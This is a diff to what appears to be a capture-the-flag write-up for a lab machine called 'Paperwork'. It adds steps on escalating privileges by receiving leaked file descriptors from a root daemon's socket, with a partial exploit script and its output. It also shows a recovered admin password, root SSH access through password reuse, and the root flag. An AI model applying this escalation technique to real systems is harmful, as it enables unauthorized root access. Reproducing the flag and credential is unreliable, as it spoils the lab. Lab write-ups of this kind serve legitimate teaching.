@@ -504,11 +504,50 @@ archivist@paperwork:~$ cat user.txt
 
 ![[Pasted image 20260813134543.png]]
 
+**Why This Works:** The `authorized_keys` file contains public keys that are allowed to log in. By adding our key, we can SSH in as `archivist`.
 
+
+
+---
+
+## Step 10: Privilege Escalation - File Descriptor Leak
+
+### Understanding the Management Socket
+
+The `paperwork.service` runs as root and exposes a management socket:
+```bash
+archivist@paperwork:~$ ls -la /run/paperwork/mgmt.sock
+srw-rw-r-- 1 root root 0 Aug 13 06:59 /run/paperwork/mgmt.sock
+```
 
 
 ![[Pasted image 20260813185916.png]]
 
+**Why This Matters:**
+- The socket is owned by root and has group permissions
+- `archivist` is in the group, so we can access it
+- The daemon leaks file descriptors when it detects "malicious" activity
+
+### The File Descriptor Leak Vulnerability
+
+**How It Works:**
+1. The `paperwork-daemon` opens `/etc/paperwork/admin_pins.conf` at startup
+2. It keeps the file descriptor open
+3. When it detects suspicious activity, it enters "lockdown" mode
+4. It sends the file descriptor to the client via `SCM_RIGHTS`
+5. Once we receive the file descriptor, we can read the file regardless of permissions
+
+### Checking for Malicious Activity
+```python
+def scan_for_malice():
+    with open('/home/archivist/printer/logs/commands.log', 'r') as f:
+        content = f.read().upper()
+        return any(t in content for t in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"])
+```
+
+**Why This Triggers:** When we exploited the Path Traversal vulnerability, we used FSUPLOAD and FSDOWNLOAD commands. These are logged in `/home/archivist/printer/logs/commands.log`. The daemon sees these and thinks there's been malicious activity!
+
+### Creating the Exploit Script
 
 ```python
 #!/usr/bin/env python3
@@ -568,20 +607,75 @@ if __name__ == "__main__":
     main()
 ```
 
+**What This Script Does:**
+1. Connects to the management socket
+2. Receives file descriptors via `SCM_RIGHTS`
+3. Reads the content of the received file descriptors
+4. Extracts the ADMIN_PASSWORD
+
+**Result:**
+```bash
+[+] Connected successfully!
+[+] Message: b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'
+[+] Received 2 file descriptors: [4, 5]
+
+[+] File Descriptor 5 Content:
+============================================================
+ADMIN_PASSWORD=ApparelMortuaryCedar22
+============================================================
+
+[!] PASSWORD FOUND: ApparelMortuaryCedar22
+```
+
 
 
 ![[Pasted image 20260813185936.png]]
 
 
 
+---
+
+## Step 11: Password Reuse - Root Access
+
+### Understanding Password Reuse
+
+Password reuse is one of the most common security failures. When a password is used in multiple places, compromising one system often leads to compromising others.
+
+### SSH as root
+```bash
+ssh root@paperwork.htb
+Password: ApparelMortuaryCedar22
+```
+
+
 ![[Pasted image 20260813190049.png]]
 
+
+**Result:**
+```bash
+root@paperwork:~# whoami
+root
+root@paperwork:~# cat /root/root.txt
+7134fe8b9c2643d4339042722d079c58
+```
 
 
 ![[Pasted image 20260813190104.png]]
 
+**Why This Works**
+The password we discovered in `/etc/paperwork/admin_pins.conf` is reused as the root SSH password. This is a common security misconfiguration.
+
+
+
+---
+
+## Step 12: Machine Owned
+
+Congratulations! We have successfully compromised the Paperwork machine.
 
 
 ![[Pasted image 20260813190142.png]]
 
 
+---
+---
